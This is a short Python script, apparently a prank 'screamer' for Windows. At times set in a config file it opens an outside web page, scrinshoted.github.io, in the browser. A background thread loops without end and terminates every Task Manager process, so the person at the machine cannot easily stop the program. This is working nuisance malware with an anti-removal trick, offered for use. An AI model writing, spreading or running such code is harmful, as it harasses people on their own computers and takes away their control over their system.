from threading import Thread
from time import sleep
import psutil
from config import ACTIVATE
import datetime
import os


def run_screammer():
    os.popen("start https://scrinshoted.github.io/")


def match_time(time: datetime.time, template: str):
    h, m, s = time.hour, time.minute, time.second
    template = template.split(':')

    if template[0] != '*' and template[0] != str(h): return False
    if len(template) >= 2 and template[1] != '*' and template[1] != str(m): return False
    if len(template) >= 3 and template[2] != '*' and template[2] != str(s): return False

    return True


def scream():
    while True:
        time = datetime.datetime.today().time()

        if match_time(time, "0:0"):
            for i in range(len(ACTIVATE)):
                ACTIVATE[i][1] = False

        for i in range(len(ACTIVATE)):
            if ACTIVATE[i][1]: continue
            if not match_time(time, ACTIVATE[i][0]): continue
            ACTIVATE[i][1] = True

            run_screammer()


def taskmgr_kill():
    while True:
        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['name'] == "Taskmgr.exe":  # Имя процесса может быть "Telegram.exe" для Windows
                    process.terminate()  # Завершение процесса
            except (psutil.NoSuchProcess, psutil.AccessDenied):
            # Если процесс уже завершен или доступ к нему запрещен
                continue


def main():
    Thread(target=taskmgr_kill).start()
    scream()


if __name__ == "__main__":
    main()